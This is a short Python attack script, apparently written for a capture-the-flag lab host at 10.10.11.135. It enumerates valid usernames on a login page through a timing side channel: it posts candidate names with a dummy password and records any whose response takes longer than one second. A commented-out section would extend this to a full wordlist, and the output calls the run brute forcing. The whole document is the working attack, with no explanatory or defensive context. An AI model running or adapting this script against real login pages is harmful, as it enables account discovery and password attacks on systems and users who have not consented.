#!/usr/bin/env python3

import requests, sys

names = ["test", "aaron", "admin", "doesntexistlol"]
found = []
url = "http://10.10.11.135/login.php?login=true"

# try:
# 	print("[.] Reading wordlist...")
# 	with open(sys.argv[1], 'r') as f:
# 		lines = f.readlines()
# 		for line in lines:
# 			names.append(line.strip())
# 	print("[+] Done")
# except:
# 	print("[-] Error reading wordlist")
# 	exit()

for name in names:
	print(f'[.] Trying: {name}')
	data = {
		"user":name,
		"password":"test"
	}
	r = requests.post(url, data=data)
	time = r.elapsed.total_seconds()
	if time > 1:
		print(f"[+] Found: '{name}'")
		found.append(name)

print("\n\n[+] Done brute forcing")
print("[+] Found usernames:")
print(", ".join(found))